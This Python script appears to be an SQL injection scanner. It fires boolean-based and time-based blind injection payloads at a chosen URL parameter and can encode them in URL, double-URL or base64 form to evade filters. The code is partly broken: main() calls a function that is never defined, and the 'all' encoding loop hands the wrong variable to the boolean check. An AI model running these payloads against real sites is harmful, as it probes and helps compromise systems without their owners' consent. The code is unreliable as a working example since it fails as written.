#!/usr/bin/env python3
import urllib.parse
import base64
import requests
import time
import argparse

TRUE_PAYLOADS = [
    "' AND 1=1 --",
    " AND 1=1 --",
    "' OR 1=1 --",
    " OR 1=1 --",
]

FALSE_PAYLOADS = [
    "' AND 1=2 --",
    " AND 1=2 --",
    "' OR 1=2 --",
    " OR 1=2 --",
]

TIME_BASED_PAYLOADS = [
    "' AND SLEEP(5) --",
    " AND SLEEP(5) --",
    "' OR SLEEP(5) --",
    " OR SLEEP(5) --",
]

ENCODINGS = ["none", "url", "double", "base64"]

def encode_payload(payload, method):
    if method == "url":
        return urllib.parse.quote(payload)
    elif method == "double":
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif method == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif method == "none" or method is None:
        return payload
    else:
        print(f"Unknown encoding method: {method}")
        return payload

def get_response_size(url, param, payload, encoding):
    encoded_payload = encode_payload(payload, encoding)
    try:
        response = requests.get(url, params={param: encoded_payload}, timeout=10)
        if response.status_code == 200:
            return len(response.text)
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
    return None


def boolean_based_detection(url, param, encoding, tolerance=20, required_matches=2):
    try:
        baseline_res = requests.get(url, params={param: ""}, timeout=10)
        baseline_size = len(baseline_res.text)
    except requests.exceptions.RequestException as e:
        print(f"[!] Could not reach target: {e}")
        return False

    matches = 0

    for true_payload, false_payload in zip(TRUE_PAYLOADS, FALSE_PAYLOADS):
        true_size = get_response_size(url, param, true_payload, encoding)
        false_size = get_response_size(url, param, false_payload, encoding)

        if true_size is None or false_size is None:
            continue

        true_close = abs(true_size - baseline_size) <= tolerance
        false_far = abs(false_size - baseline_size) > tolerance

        print(f"[DEBUG] TRUE: {true_size}, FALSE: {false_size}, BASE: {baseline_size}")

        if true_close and false_far:
            matches += 1

    if matches >= required_matches:
        print(f"[+] Likely Boolean-Based SQLi ({matches} strong matches)")
        return True
    else:
        print(f"[-] Not likely vulnerable ({matches} matches)")
        return False

def time_based_injections(url, param, encoding, attempts=3, delay_threshold=4):
    baseline_times = []
    
    for _ in range(attempts):
        start = time.time()
        requests.get(url, params={param: ""}, timeout=10)
        baseline_times.append(time.time() - start)

    baseline_avg = sum(baseline_times) / len(baseline_times)

    for payload in TIME_BASED_PAYLOADS:
        delays = []
        for _ in range(attempts):
            encoded_payload = encode_payload(payload, encoding)
            start = time.time()
            try:
                requests.get(url, params={param: encoded_payload}, timeout=15)
                delays.append(time.time() - start)
            except requests.exceptions.RequestException:
                continue

        if not delays:
            continue

        avg_delay = sum(delays) / len(delays)

        print(f"[DEBUG] Baseline: {baseline_avg:.2f}s | Payload: {avg_delay:.2f}s")

        if avg_delay - baseline_avg > delay_threshold:
            print("[+] Likely Time-Based SQLi")
            return True

    print("[-] Not likely vulnerable to Time-Based SQLi")
    return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="URL to test")
    parser.add_argument("-p", "--param", required=True, help="Parameter to test")
    parser.add_argument("-e", "--encode", help="Encoding method (none, url, double, base64)", default="none")
    args = parser.parse_args()

    encoding = args.encode if args.encode else "none"

    if encoding == "all":
        for enc in ENCODINGS:
            print(f"[+] Testing with encoding: {enc}")
            if boolean_based_detection(args.url, args.param, encoding):
                return
            if time_based_injections(args.url, args.param, enc):
                return
    else:
        if not compare_response_sizes(args.url, args.param, encoding):
            if not time_based_injections(args.url, args.param, encoding):
                print("[-] No SQL injection detected. Exiting...")

if __name__ == "__main__":
    main()
